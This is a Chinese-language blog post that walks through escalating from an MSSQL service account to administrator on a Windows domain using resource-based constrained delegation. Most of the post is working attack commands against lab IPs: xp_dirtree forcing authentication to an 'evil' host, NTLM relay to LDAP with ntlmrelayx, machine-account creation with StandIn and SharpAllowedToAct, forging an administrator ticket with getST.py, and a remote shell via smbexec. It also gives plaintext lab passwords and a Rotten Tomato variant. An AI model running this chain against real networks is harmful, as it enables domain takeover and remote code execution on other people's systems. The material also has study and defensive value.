---
title: MSSQL结合RBCD提权 - nice_0e3
url: https://www.cnblogs.com/nice0e3/p/17041293.html
source: 博客园 - nice_0e3
date: 2023-01-11
fetch_date: 2025-10-04T03:32:10.378009
---

# MSSQL结合RBCD提权 - nice_0e3

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/nice0e3/)

# [nice\_0e3](https://www.cnblogs.com/nice0e3)

## 理想与热爱

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/nice0e3/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/nice_0e3)
* 订阅
* [管理](https://i.cnblogs.com/)

# [MSSQL结合RBCD提权](https://www.cnblogs.com/nice0e3/p/17041293.html "发布于 2023-01-10 20:17")

## MSSQL结合RBCD提权

### 原理

这里使用中继的方式给他中继到ldap中去添加`msDS-AllowedToActOnBehalfOfOtherIdentity`属性。默认域控的ms-DS-MachineAccountQuota属性设置允许所有域用户向一个域添加10个计算机帐户，就是说只要有一个域凭据就可以在域内任意添加机器账户。这个凭据可以是域内的用户账户、服务账户、机器账户。而在mssql当前是nt service权限所以用的是机器账户去做认证，机器账户是可以创建机器账户的。

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201515450-1914575396.png)

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201520479-647285354.png)

### 限制

需要开启webclient服务

完全限定名（FQDN）这个可以添加dns记录来实现

### 中继的攻击思路

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201527438-1621254939.png)

### xp\_dirtree

`xp_dirtree`使用以下方式进行请求是通过 UNC 的触发方式同样可以对 WebDAV 进行认证，WebDAV请求去中继是不会有NTLM签名限制问题的。具体可以参考https://en.hackndo.com/ntlm-relay/

```
xp_dirtree '\\hostname@SSL\test' --ssl 443
xp_dirtree '\\hostname@SSL@1234\test' --ssl port 1234
xp_dirtree '\\hostname@1234\test' --http
```

### 复现

```
sc query webclient
```

查询webclient是否开启

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201532075-387025979.png)

```
Invoke-DNSUpdate -DNSType A -DNSName unicodesec -DNSData 192.168.92.151
```

```
python3 ntlmrelayx.py -t ldap://172.16.108.165 -smb2support --delegate-access --add-computer -debug
```

也可以使用

```
execute-assembly /Users/giaogiao/Desktop/tools/Tools/内网/StandIn_v13_Net35_45/StandIn_v13_Net45.exe  --computer DESKTOP-JSMITH --make
```

在当前权限下添加一个DESKTOP-JSMITH的机器账户

```
exec master.dbo.xp_dirtree '\\evil@80\test'
```

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201546584-1649731806.png)

触发webdav请求

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201552052-1454504686.png)

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201557656-1373514333.png)

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201604794-835900497.png)

下面就是拿创建的机器账户获取高权限票据，和资源委派的步骤一样

```
python3 getST.py -spn cifs/DESKTOP-0ND3PBE.kdc.com 'kdc.com/LLGSQUWS$:V)iU_pwJ)(tEr!l' -impersonate administrator -dc-ip 172.16.108.165
```

```
export KRB5CCNAME=administrator.ccache
python3 smbexec.py -k -no-pass DESKTOP-0ND3PBE.kdc.com -target-ip 172.16.108.164 -debug
```

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201610599-1417248682.png)

## 烂番茄(Rotten Tomato)

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201614838-272601446.png)

```
execute-assembly /Users/nice0e3/Downloads/StandIn_v13_Net35_45/StandIn_v13_Net35.exe  --computer DESKTOP-JSMITH --make
```

使用当前权限添加机器账户

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201619009-870302317.png)

```
execute-assembly /Users/nice0e3/Downloads/StandIn_v13_Net35_45/StandIn_v13_Net35.exe  --computer DESKTOP-0ND3PBE --sid S-1-5-21-879933513-2804727210-1548949402-1603
```

添加`msDS-AllowedToActOnBehalfOfOtherIdentity`这个属性

--computer 为需要提权的用户

--sid 是添加的机器用户的sid

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201623407-1234442193.png)

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201626739-1558628192.png)

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201630237-2106126355.png)

接下来使用该机器账户申请高权限票据

```
python3 getST.py -spn cifs/DESKTOP-0ND3PBE.kdc.com 'kdc.com/DESKTOP-JSMITH$:e5YnDP1kSLpgkje' -impersonate administrator -dc-ip 172.16.108.165

export KRB5CCNAME=administrator.ccache

python3 smbexec.py -k -no-pass DESKTOP-0ND3PBE.kdc.com -target-ip 172.16.108.164 -debug
```

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201634759-2110869364.png)

### SharpAllowedToAct

也可以使用SharpAllowedToAct进行添加，需要使用原版的

<https://github.com/pkb1s/SharpAllowedToAct/>

```
execute-assembly /Users/nice0e3/Downloads/SharpAllowedToAct-Modify-main/SharpAllowedToAct/SharpAllowedToAct.exe -m giaogiao -p e5YnDP1kSLpgkje -t DESKTOP-0ND3PBE -a dc.kdc.com -d kdc.com
```

添加一个giaogiao的机器用户，并且设置`msDS-AllowedToActOnBehalfOfOtherIdentity`属性

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201640926-541492219.png)

### 删除`msDS-AllowedToActOnBehalfOfOtherIdentity`属性

```
execute-assembly /Users/nice0e3/Downloads/StandIn_v13_Net35_45/StandIn_v13_Net35.exe  --computer DESKTOP-0ND3PBE --remove
```

![img](https://img2023.cnblogs.com/blog/1993669/202301/1993669-20230110201645960-922958164.png)

## 参考

<https://www.freebuf.com/articles/database/278397.html>
<https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
<https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/>

posted @
2023-01-10 20:17
[nice\_0e3](https://www.cnblogs.com/nice0e3)
阅读(1046)
评论(1)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025